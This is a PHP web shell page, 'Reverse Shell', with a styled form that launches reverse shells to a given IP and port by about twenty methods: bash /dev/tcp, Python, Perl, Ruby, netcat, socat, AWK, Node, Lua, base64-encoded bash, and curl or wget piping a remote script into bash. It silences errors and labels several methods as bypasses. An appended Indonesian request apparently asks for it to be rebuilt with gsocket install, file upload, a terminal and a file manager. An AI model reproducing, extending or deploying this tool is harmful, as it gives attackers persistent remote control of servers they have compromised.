<?php
@ini_set('max_execution_time',0);
@ini_set('display_errors',0);
@error_reporting(0);

if($_POST){
    $i=$_POST['i'];
    $p=$_POST['p'];
    $method=$_POST['method'];
    
    echo"<pre>Connecting $i:$p via $method...\n";
    flush();

    switch($method){
        case 'exec':
            if(function_exists('exec')){
                @exec("bash -c 'bash -i >& /dev/tcp/$i/$p 0>&1' >/dev/null 2>&1 &",$o,$r);
                usleep(500000);
                echo"[OK] Exec bash method\n";
            }else{
                echo"[FAIL] exec() is disabled\n";
            }
            exit;

        case 'shell_exec':
            if(function_exists('shell_exec')){
                @shell_exec("(bash -c 'bash -i >& /dev/tcp/$i/$p 0>&1' &) >/dev/null 2>&1 &");
                usleep(500000);
                echo"[OK] Shell_exec method\n";
            }else{
                echo"[FAIL] shell_exec() is disabled\n";
            }
            exit;

        case 'system':
            if(function_exists('system')){
                @system("nohup bash -c 'bash -i >& /dev/tcp/$i/$p 0>&1' >/dev/null 2>&1 &",$r);
                usleep(500000);
                echo"[OK] System method\n";
            }else{
                echo"[FAIL] system() is disabled\n";
            }
            exit;

        case 'passthru':
            if(function_exists('passthru')){
                @passthru("bash -c 'bash -i >& /dev/tcp/$i/$p 0>&1' >/dev/null 2>&1 &");
                usleep(500000);
                echo"[OK] Passthru method\n";
            }else{
                echo"[FAIL] passthru() is disabled\n";
            }
            exit;

        case 'popen':
            if(function_exists('popen')){
                $h=@popen("bash -c 'bash -i >& /dev/tcp/$i/$p 0>&1' &",'r');
                if($h){
                    echo"[OK] Popen method\n";
                }else{
                    echo"[FAIL] popen() failed\n";
                }
            }else{
                echo"[FAIL] popen() is disabled\n";
            }
            exit;

        case 'pcntl':
            if(function_exists('pcntl_fork')&&function_exists('pcntl_exec')){
                $pid=@pcntl_fork();
                if($pid==0){
                    @pcntl_exec('/bin/bash',['-c',"bash -i >& /dev/tcp/$i/$p 0>&1"]);
                    exit;
                }
                usleep(500000);
                echo"[OK] PCNTL method\n";
            }else{
                echo"[FAIL] pcntl functions are disabled\n";
            }
            exit;

        case 'python':
            @exec("python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$i\",$p));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])' >/dev/null 2>&1 &");
            usleep(500000);
            echo"[OK] Python fallback\n";
            exit;

        case 'proc_open':
            if(function_exists('proc_open')){
                $s=@fsockopen($i,$p,$e,$es,5);
                if($s){
                    $d=[0=>$s,1=>$s,2=>$s];
                    $pr=@proc_open('/bin/sh -i',$d,$pp);
                    if(is_resource($pr)){
                        echo"[OK] Connected via proc_open\n";
                    }else{
                        echo"[FAIL] proc_open() failed to spawn shell\n";
                    }
                }else{
                    echo"[FAIL] Could not connect to $i:$p\n";
                }
            }else{
                echo"[FAIL] proc_open() is disabled\n";
            }
            exit;

        case 'bypass_backtick':
            
            $cmd = "`/bin/bash -c 'bash -i >& /dev/tcp/$i/$p 0>&1' &`";
            @eval($cmd);
            usleep(500000);
            echo"[OK] Backtick bypass method\n";
            exit;

        case 'bypass_perl':
            
            @exec("perl -e 'use Socket;\$i=\"$i\";\$p=$p;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};' >/dev/null 2>&1 &");
            usleep(500000);
            echo"[OK] Perl bypass method\n";
            exit;

        case 'bypass_ruby':
            
            @exec("ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"$i\",$p);while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end' >/dev/null 2>&1 &");
            usleep(500000);
            echo"[OK] Ruby bypass method\n";
            exit;

        case 'bypass_php':
            
            $sock=@fsockopen($i,$p);
            if($sock){
                $proc=@proc_open('/bin/sh',[0=>$sock,1=>$sock,2=>$sock],$pipes);
                if(is_resource($proc)){
                    echo"[OK] PHP socket bypass\n";
                    exit;
                }
            }
            echo"[FAIL] PHP socket bypass failed\n";
            exit;

        case 'bypass_nc':
            
            @exec("nc -e /bin/sh $i $p >/dev/null 2>&1 &");
            usleep(300000);
            @exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $i $p >/tmp/f &");
            usleep(300000);
            @exec("nc $i $p -e /bin/bash >/dev/null 2>&1 &");
            usleep(500000);
            echo"[OK] Netcat bypass methods\n";
            exit;

        case 'bypass_curl':
            
            @exec("curl -s http://$i:$p/shell.sh | bash >/dev/null 2>&1 &");
            usleep(500000);
            echo"[OK] Curl download bypass\n";
            exit;

        case 'bypass_wget':
            
            @exec("wget -q -O- http://$i:$p/shell.sh | bash >/dev/null 2>&1 &");
            usleep(500000);
            echo"[OK] Wget download bypass\n";
            exit;

        case 'bypass_telnet':
            
            @exec("rm -f /tmp/p; mknod /tmp/p p && telnet $i $p 0</tmp/p | /bin/bash 1>/tmp/p &");
            usleep(500000);
            echo"[OK] Telnet bypass method\n";
            exit;

        case 'bypass_awk':
            
            @exec("awk 'BEGIN{s=\"/inet/tcp/0/$i/$p\";for(;s|&getline c;close(c))while(c|getline)print|&s;close(s)}' >/dev/null 2>&1 &");
            usleep(500000);
            echo"[OK] AWK bypass method\n";
            exit;

        case 'bypass_socat':
            
            @exec("socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:$i:$p >/dev/null 2>&1 &");
            usleep(500000);
            echo"[OK] Socat bypass method\n";
            exit;

        case 'bypass_java':
            
            $java_code = "r=Runtime.getRuntime();p=r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/$i/$p;cat <&5 | while read line; do \\\$line 2>&5 >&5; done\"] as String[]);p.waitFor();";
            @exec("java -jar /tmp/rev.jar $i $p >/dev/null 2>&1 &");
            usleep(500000);
            echo"[OK] Java bypass method\n";
            exit;

        case 'bypass_node':
            
            @exec("node -e 'require(\"child_process\").exec(\"bash -c \\\"bash -i >& /dev/tcp/$i/$p 0>&1\\\"\")' >/dev/null 2>&1 &");
            usleep(500000);
            echo"[OK] Node.js bypass method\n";
            exit;

        case 'bypass_lua':
            
            @exec("lua -e 'local s=require(\"socket\").tcp();s:connect(\"$i\",$p);while true do local r=s:receive();local f=io.popen(r,\"r\");s:send(f:read(\"*a\"));f:close();end' >/dev/null 2>&1 &");
            usleep(500000);
            echo"[OK] Lua bypass method\n";
            exit;

        case 'bypass_base64':
            
            $encoded = base64_encode("bash -i >& /dev/tcp/$i/$p 0>&1");
            @exec("echo $encoded | base64 -d | bash >/dev/null 2>&1 &");
            usleep(500000);
            echo"[OK] Base64 bypass method\n";
            exit;

        case 'auto':
            
            if(function_exists('exec')){
                @exec("bash -c 'bash -i >& /dev/tcp/$i/$p 0>&1' >/dev/null 2>&1 &",$o,$r);
                usleep(500000);echo"[OK] Exec bash method\n";exit;
            }
            if(function_exists('shell_exec')){
                @shell_exec("(bash -c 'bash -i >& /dev/tcp/$i/$p 0>&1' &) >/dev/null 2>&1 &");
                usleep(500000);echo"[OK] Shell_exec method\n";exit;
            }
            if(function_exists('system')){
                @system("nohup bash -c 'bash -i >& /dev/tcp/$i/$p 0>&1' >/dev/null 2>&1 &",$r);
                usleep(500000);echo"[OK] System method\n";exit;
            }
            if(function_exists('passthru')){
                @passthru("bash -c 'bash -i >& /dev/tcp/$i/$p 0>&1' >/dev/null 2>&1 &");
                usleep(500000);echo"[OK] Passthru method\n";exit;
            }
            if(function_exists('popen')){
                $h=@popen("bash -c 'bash -i >& /dev/tcp/$i/$p 0>&1' &",'r');
                if($h){echo"[OK] Popen method\n";exit;}
            }
            if(function_exists('proc_open')){
                $s=@fsockopen($i,$p,$e,$es,5);
                if($s){
                    $d=[0=>$s,1=>$s,2=>$s];
                    $pr=@proc_open('/bin/sh -i',$d,$pp);
                    if(is_resource($pr)){echo"[OK] Connected via proc_open\n";exit;}
                }
            }
            echo"[FAIL] All methods blocked\n";
            exit;
    }
}


$funcs = [
    'exec' => function_exists('exec'),
    'shell_exec' => function_exists('shell_exec'),
    'system' => function_exists('system'),
    'passthru' => function_exists('passthru'),
    'popen' => function_exists('popen'),
    'pcntl' => function_exists('pcntl_fork') && function_exists('pcntl_exec'),
    'proc_open' => function_exists('proc_open')
];
?>
<!DOCTYPE html>
<html>
<head>
    <title>Reverse Shell</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box;}
        body{
            font-family:'Consolas','Monaco',monospace;
            background:#0a0e27;
            color:#00ff41;
            padding:20px;
            min-height:100vh;
        }
        .container{
            max-width:900px;
            margin:0 auto;
            background:#111827;
            border:1px solid #1f2937;
            border-radius:8px;
            padding:30px;
            box-shadow:0 0 20px rgba(0,255,65,0.1);
        }
        h1{
            text-align:center;
            margin-bottom:10px;
            font-size:24px;
            color:#00ff41;
            text-shadow:0 0 10px rgba(0,255,65,0.5);
        }
        .subtitle{
            text-align:center;
            font-size:12px;
            color:#6b7280;
            margin-bottom:30px;
        }
        .info{
            background:#1f2937;
            padding:15px;
            border-radius:5px;
            margin-bottom:20px;
            font-size:13px;
            border-left:3px solid #00ff41;
        }
        form{
            display:flex;
            flex-direction:column;
            gap:15px;
        }
        .form-group{
            display:flex;
            flex-direction:column;
            gap:5px;
        }
        label{
            font-size:13px;
            color:#9ca3af;
            font-weight:bold;
        }
        input[type=text],input[type=number]{
            padding:10px;
            background:#1f2937;
            border:1px solid #374151;
            border-radius:4px;
            color:#00ff41;
            font-family:inherit;
            font-size:14px;
        }
        input:focus{
            outline:none;
            border-color:#00ff41;
            box-shadow:0 0 5px rgba(0,255,65,0.3);
        }
        .section-title{
            font-size:14px;
            color:#00ff41;
            font-weight:bold;
            margin-top:20px;
            margin-bottom:10px;
            text-transform:uppercase;
            letter-spacing:1px;
        }
        .methods{
            display:grid;
            grid-template-columns:repeat(auto-fit,minmax(140px,1fr));
            gap:10px;
            margin-top:10px;
        }
        .method-btn{
            padding:12px;
            background:#1f2937;
            border:2px solid #374151;
            border-radius:5px;
            cursor:pointer;
            transition:all 0.3s;
            font-family:inherit;
            font-size:12px;
            color:#9ca3af;
            font-weight:bold;
        }
        .method-btn:hover:not(.disabled){
            border-color:#00ff41;
            background:#374151;
            color:#00ff41;
            transform:translateY(-2px);
            box-shadow:0 4px 10px rgba(0,255,65,0.2);
        }
        .method-btn.disabled{
            opacity:0.3;
            cursor:not-allowed;
            border-color:#6b7280;
        }
        .method-btn .status{
            font-size:9px;
            display:block;
            margin-top:3px;
        }
        .bypass-btn{
            border-color:#f59e0b;
            color:#fbbf24;
        }
        .bypass-btn:hover:not(.disabled){
            border-color:#fbbf24;
            background:#374151;
            color:#fbbf24;
            box-shadow:0 4px 10px rgba(251,191,36,0.2);
        }
        .auto-btn{
            background:linear-gradient(135deg,#00ff41 0%,#00cc33 100%);
            color:#0a0e27;
            padding:15px;
            border:none;
            border-radius:5px;
            cursor:pointer;
            font-family:inherit;
            font-size:15px;
            font-weight:bold;
            text-transform:uppercase;
            letter-spacing:1px;
            transition:all 0.3s;
            margin-top:10px;
        }
        .auto-btn:hover{
            transform:translateY(-2px);
            box-shadow:0 6px 20px rgba(0,255,65,0.4);
        }
        pre{
            background:#0a0e27;
            padding:15px;
            border-radius:5px;
            border:1px solid #1f2937;
            overflow-x:auto;
            margin-top:20px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>🔓 Reverse Shell</h1>
        <div class="subtitle">Standard & Bypass Methods</div>
        
        <div class="info">
            <strong>Listener:</strong> nc -lvnp [PORT]<br>
            <strong>Your IP:</strong> <?=$_SERVER['REMOTE_ADDR']?>
        </div>

        <form method="post">
            <div class="form-group">
                <label>🌐 IP Address</label>
                <input type="text" name="i" value="151.240.0.3" required>
            </div>

            <div class="form-group">
                <label>🔌 Port</label>
                <input type="number" name="p" value="4444" required>
            </div>

            <div class="section-title">⚡ Standard Methods</div>
            <div class="methods">
                <button type="submit" name="method" value="exec" class="method-btn <?=!$funcs['exec']?'disabled':''?>" <?=!$funcs['exec']?'disabled':''?>>
                    exec()
                    <span class="status"><?=$funcs['exec']?'✓ Available':'✗ Disabled'?></span>
                </button>
                
                <button type="submit" name="method" value="shell_exec" class="method-btn <?=!$funcs['shell_exec']?'disabled':''?>" <?=!$funcs['shell_exec']?'disabled':''?>>
                    shell_exec()
                    <span class="status"><?=$funcs['shell_exec']?'✓ Available':'✗ Disabled'?></span>
                </button>
                
                <button type="submit" name="method" value="system" class="method-btn <?=!$funcs['system']?'disabled':''?>" <?=!$funcs['system']?'disabled':''?>>
                    system()
                    <span class="status"><?=$funcs['system']?'✓ Available':'✗ Disabled'?></span>
                </button>
                
                <button type="submit" name="method" value="passthru" class="method-btn <?=!$funcs['passthru']?'disabled':''?>" <?=!$funcs['passthru']?'disabled':''?>>
                    passthru()
                    <span class="status"><?=$funcs['passthru']?'✓ Available':'✗ Disabled'?></span>
                </button>
                
                <button type="submit" name="method" value="popen" class="method-btn <?=!$funcs['popen']?'disabled':''?>" <?=!$funcs['popen']?'disabled':''?>>
                    popen()
                    <span class="status"><?=$funcs['popen']?'✓ Available':'✗ Disabled'?></span>
                </button>
                
                <button type="submit" name="method" value="pcntl" class="method-btn <?=!$funcs['pcntl']?'disabled':''?>" <?=!$funcs['pcntl']?'disabled':''?>>
                    pcntl()
                    <span class="status"><?=$funcs['pcntl']?'✓ Available':'✗ Disabled'?></span>
                </button>
                
                <button type="submit" name="method" value="proc_open" class="method-btn <?=!$funcs['proc_open']?'disabled':''?>" <?=!$funcs['proc_open']?'disabled':''?>>
                    proc_open()
                    <span class="status"><?=$funcs['proc_open']?'✓ Available':'✗ Disabled'?></span>
                </button>
                
                <button type="submit" name="method" value="python" class="method-btn">
                    Python
                    <span class="status">✓ Fallback</span>
                </button>
            </div>

            <div class="section-title">🔥 Bypass Methods</div>
            <div class="methods">
                <button type="submit" name="method" value="bypass_perl" class="method-btn bypass-btn">
                    Perl
                    <span class="status">🛡️ Bypass</span>
                </button>
                
                <button type="submit" name="method" value="bypass_ruby" class="method-btn bypass-btn">
                    Ruby
                    <span class="status">🛡️ Bypass</span>
                </button>
                
                <button type="submit" name="method" value="bypass_php" class="method-btn bypass-btn">
                    PHP Socket
                    <span class="status">🛡️ Bypass</span>
                </button>
                
                <button type="submit" name="method" value="bypass_nc" class="method-btn bypass-btn">
                    Netcat
                    <span class="status">🛡️ Bypass</span>
                </button>
                
                <button type="submit" name="method" value="bypass_curl" class="method-btn bypass-btn">
                    Curl
                    <span class="status">🛡️ Bypass</span>
                </button>
                
                <button type="submit" name="method" value="bypass_wget" class="method-btn bypass-btn">
                    Wget
                    <span class="status">🛡️ Bypass</span>
                </button>
                
                <button type="submit" name="method" value="bypass_telnet" class="method-btn bypass-btn">
                    Telnet
                    <span class="status">🛡️ Bypass</span>
                </button>
                
                <button type="submit" name="method" value="bypass_awk" class="method-btn bypass-btn">
                    AWK
                    <span class="status">🛡️ Bypass</span>
                </button>
                
                <button type="submit" name="method" value="bypass_socat" class="method-btn bypass-btn">
                    Socat
                    <span class="status">🛡️ Bypass</span>
                </button>
                
                <button type="submit" name="method" value="bypass_node" class="method-btn bypass-btn">
                    Node.js
                    <span class="status">🛡️ Bypass</span>
                </button>
                
                <button type="submit" name="method" value="bypass_lua" class="method-btn bypass-btn">
                    Lua
                    <span class="status">🛡️ Bypass</span>
                </button>
                
                <button type="submit" name="method" value="bypass_base64" class="method-btn bypass-btn">
                    Base64
                    <span class="status">🛡️ Bypass</span>
                </button>
            </div>

            <button type="submit" name="method" value="auto" class="auto-btn">
                🚀 AUTO CONNECT (Try All Methods)
            </button>
        </form>
    </div>
</body>
</html>

rebuild total, expert
hapus semua method bypassnya dan sisakn method biasa aja
add install gsocket, add tempat file upload  add terminal add file manager simple

